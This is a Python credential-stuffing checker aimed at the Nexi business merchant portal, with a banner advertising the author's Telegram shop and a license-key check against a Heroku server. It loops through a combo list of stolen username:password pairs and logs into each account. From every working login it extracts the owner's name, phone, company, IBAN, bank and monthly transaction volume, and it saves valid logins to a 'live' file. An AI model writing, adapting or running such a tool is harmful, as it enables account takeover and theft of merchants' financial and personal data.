import requests
import re

def get_nexi_data(username, password):

    try:
        # --- SC-POST REQUEST ---
        url = "https://business.nexi.it/cas/oidc/accessToken?grant_type=password&client_id=MerchantPortal-service-1254789641257"
        headers = {
            "Content-type": "application/json",
            "Host": "business.nexi.it",
            "Origin": "https://www.nexi.it",
            "Referer": "https://www.nexi.it/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "X-Requested-With": "XMLHttpRequest"
        }
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, headers=headers, json=data)

        # --- CR-CEK KEYCHECK ---
        if "/cas/oidc/accessToken" in response.text or "{\"access_token\":\"" in response.text:
            # --- ACS-TOKEN PARSE ---
            match = re.search(r"{\"access_token\":\"(.*?)\",\"", response.text)
            if match:
                TK = match.group(1)

                # --- GET-PROFIL REQUEST ---
                url = "https://business.nexi.it/services/merchant/user/merchantProfile"
                headers = {
                    "Authorization": f"Bearer {TK}",
                    "Content-Type": "application/json",
                    "Host": "business.nexi.it",
                    "Referer": "https://business.nexi.it/profile/data",
                    "Sec-Ch-Ua": "\"Microsoft Edge\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": "\"Windows\"",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"
                }

                response = requests.get(url, headers=headers)

                # --- KEYCHECK ---
                if "\",\"bankName\":\"" in response.text or "HRTRGRGRG" in response.text: 
                    # --- GET-NAME PARSE, PARSE, NAME PARSE, etc. ---
                    data = {}
                    data["Nome"] = re.search(r",\"firstName\":\"(.*?)\"", response.text).group(1) if re.search(r",\"firstName\":\"(.*?)\"", response.text) else None
                    data["Cognome"] = re.search(r"\",\"lastName\":\"(.*?)\"", response.text).group(1) if re.search(r"\",\"lastName\":\"(.*?)\"", response.text) else None
                    data["Numero Di Telefono"] = re.search(r"\",\"phone\":\"(.*?)\"", response.text).group(1) if re.search(r"\",\"phone\":\"(.*?)\"", response.text) else None
                    data["Nome Azienda"] = re.search(r"\[{\"name\":\"(.*?)\",\"", response.text).group(1) if re.search(r"\[{\"name\":\"(.*?)\",\"", response.text) else None
                    data["Iban"] = re.search(r"\[{\"iban\":\"(.*?)\"", response.text).group(1) if re.search(r"\[{\"iban\":\"(.*?)\"", response.text) else None
                    data["Nome Banca"] = re.search(r"\",\"bankName\":\"(.*?)\"", response.text).group(1) if re.search(r"\",\"bankName\":\"(.*?)\"", response.text) else None

                    # --- SVC REQUEST ---
                    url = "https://business.nexi.it/services/transaction/dashboard/chart?period=MONTH"
                    response = requests.get(url, headers=headers)

                    # --- CPT PARSE ---
                    data["Transato Questo Mese"] = re.search(r"{\"index\":0,\"cost\":(.*?),\"", response.text).group(1) if re.search(r"{\"index\":0,\"cost\":(.*?),\"", response.text) else None

                    return data

    except Exception as e:
        print(f"An error occurred: {e}")
        return None


if __name__ == "__main__":

    print(
        """
 ▐ ▄ ▄▄▄ .▐▄• ▄ ▪       ▄▄·  ▄ .▄▄▄▄ . ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  
•█▌▐█▀▄.▀· █▌█▌▪██     ▐█ ▌▪██▪▐█▀▄.▀·▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·
▐█▐▐▌▐▀▀▪▄ ·██· ▐█·    ██ ▄▄██▀▐█▐▀▀▪▄██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
██▐█▌▐█▄▄▌▪▐█·█▌▐█▌    ▐███▌██▌▐▀▐█▄▄▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌
▀▀ █▪ ▀▀▀ •▀▀ ▀▀▀▀▀    ·▀▀▀ ▀▀▀ · ▀▀▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀
                      CODE BY MASANTO
==========================================================
      TELEGRAM @schtshop | FOLLOW MY TIKTOK @scht_
==========================================================
"""
    )
    key = input("Masukkan key: ")

    try:
        # Check key validity
        response = requests.get(f"https://apiqu-46b0165ac641.herokuapp.com/license.php?key={key}")
        response_json = response.json()  # Parse the response as JSON

        if "status" in response_json and response_json["status"] == "error":
            print(f"Error: {response_json['message']}")
            exit()

        # If key is valid, proceed with combo file input
        combo_file = input("Enter combo file name: ")
        
        try:
            with open(combo_file, "r") as f, open("live.txt", "w") as live_f:
                for line in f:
                    try:
                        username, password = line.strip().split(":")
                        nexi_data = get_nexi_data(username, password)

                        if nexi_data:
                            # LIVE => username|password|Nome|Cognome|... (green)
                            live_data = "|".join([
                                username,
                                password,
                                nexi_data.get("Nome", ""),
                                nexi_data.get("Cognome", ""),
                                nexi_data.get("Numero Di Telefono", ""),
                                nexi_data.get("Nome Azienda", ""),
                                nexi_data.get("Iban", ""),
                                nexi_data.get("Nome Banca", ""),
                                nexi_data.get("Transato Questo Mese", "")
                            ])
                            print(f"\033[92mLIVE => {live_data}\033[0m")
                            live_f.write(live_data + "\n")
                        else:
                            # DIE => username:password (red)
                            print(f"\033[91mDIE => {username}:{password}\033[0m")

                    except ValueError:
                        print(f"Invalid line format: {line.strip()}")

        except FileNotFoundError:
            print(f"Combo file not found: {combo_file}")

    except requests.exceptions.RequestException as e:
        print(f"Error checking key: {e}")
    except ValueError as e:
        print(f"Error parsing JSON response: {e}")